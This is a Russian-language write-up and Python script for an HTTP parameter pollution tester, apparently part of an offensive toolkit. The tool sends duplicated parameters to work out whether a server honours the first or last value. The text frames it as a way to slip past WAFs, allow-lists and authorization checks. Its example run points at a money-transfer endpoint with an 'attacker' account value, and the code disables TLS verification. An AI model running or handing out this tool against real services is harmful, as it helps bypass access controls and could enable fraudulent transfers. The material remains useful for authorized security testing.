Проверяет, как сервер разбирает **дублирующиеся параметры** (`?id=victim&id=attacker`). Разные стеки берут первое, последнее или склеивают значения - это даёт обход проверок (валидатор видит одно значение, бизнес-логика другое). Скрипт шлёт три варианта (только первое, только второе, оба) и по разнице в ответах определяет precedence-модель, плюс пробует пробить авторизацию/фильтр пограничным значением.

> Полезно против WAF и серверных allow-list: фронт проверяет `id=victim`, а бэкенд берёт `id=attacker`. Поддерживает GET и POST (form-urlencoded).

```python
#!/usr/bin/env python3
# hpp_tester.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
import argparse, requests
requests.packages.urllib3.disable_warnings()

def req(s, a, raw_query=None, data=None):
    try:
        if a.where == "GET":
            return s.get(a.url + "?" + raw_query, verify=False, timeout=20)
        return s.post(a.url, data=data, verify=False, timeout=20)
    except requests.RequestException:
        return None

def summarize(r):
    return None if r is None else (r.status_code, len(r.text))

def main():
    ap = argparse.ArgumentParser(description="ARS3NAL HTTP parameter pollution tester")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("-p", "--param", required=True)
    ap.add_argument("--first", required=True, help="benign/expected value")
    ap.add_argument("--second", required=True, help="attacker value")
    ap.add_argument("--where", default="GET", choices=["GET", "POST"])
    a = ap.parse_args()
    s = requests.Session(); s.headers["User-Agent"] = "ARS3NAL-HPP/1.0"
    p = a.param
    cases = {
        "first-only":  (f"{p}={a.first}",                {p: a.first}),
        "second-only": (f"{p}={a.second}",               {p: a.second}),
        "dup F,S":     (f"{p}={a.first}&{p}={a.second}",  [(p, a.first), (p, a.second)]),
        "dup S,F":     (f"{p}={a.second}&{p}={a.first}",  [(p, a.second), (p, a.first)]),
    }
    res = {}
    for name, (q, d) in cases.items():
        r = req(s, a, raw_query=q, data=d)
        res[name] = summarize(r)
        print(f"[{name:>11}]  {res[name]}")
    if res["dup F,S"] == res["second-only"] and res["second-only"] != res["first-only"]:
        print("[=] server uses LAST value on duplicates (attacker wins on ?F&S)")
    elif res["dup F,S"] == res["first-only"] and res["first-only"] != res["second-only"]:
        print("[=] server uses FIRST value on duplicates")
    else:
        print("[=] inconclusive / values concatenated - inspect responses manually")

if __name__ == "__main__":
    main()
```

Запуск:
```bash
python3 hpp_tester.py -u "https://target/transfer" -p account --first 1001 --second 1002
```
